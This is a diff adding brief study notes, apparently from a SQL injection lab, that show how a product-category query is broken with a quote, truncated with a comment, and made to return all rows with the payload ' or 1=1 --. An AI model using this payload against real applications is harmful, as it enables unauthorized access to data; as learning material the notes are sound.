@@ -1,0 +1,13 @@
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+when you had change the query to = '
+=> SELECT * FROM products WHERE category = '' ' AND released = 1
+it breaks the backend
+
+so you add -- after
+=> SELECT * FROM products WHERE category = '' --' AND released = 1
+doesn't break the app but return nothing
+
+=> SELECT * FROM products WHERE category = '' or 1=1 --
+
+Final query = ' or 1=1 --
